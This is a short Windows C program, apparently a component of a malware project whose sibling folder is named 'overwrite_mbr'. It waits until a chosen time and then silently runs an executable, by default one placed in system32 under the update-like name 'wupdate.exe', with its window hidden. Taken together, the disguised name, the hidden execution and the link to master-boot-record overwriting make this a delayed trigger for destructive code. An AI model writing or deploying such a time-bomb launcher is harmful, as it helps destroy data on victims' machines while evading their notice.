#include <Windows.h>
#include <Strsafe.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <io.h>
#include <stdlib.h>

#include "../overwrite_mbr/common.h"

int main(int argc, char ** argv)
{
	int hour = 15, min = 30;
	char * program_path = "%windir%\\system32\\wupdate.exe";

	if(argc > 1)
		program_path = argv[1];
	program_path = translate_path(TEXT("windir"), "%windir%", program_path);
	if(argc > 2)
		hour = atoi(argv[2]);
	if(argc > 3)
		min = atoi(argv[3]);

	wait_until(hour, min);
	printf("Done waiting, running %s\n", program_path);
	WinExec(program_path, SW_HIDE);

	return 0;
}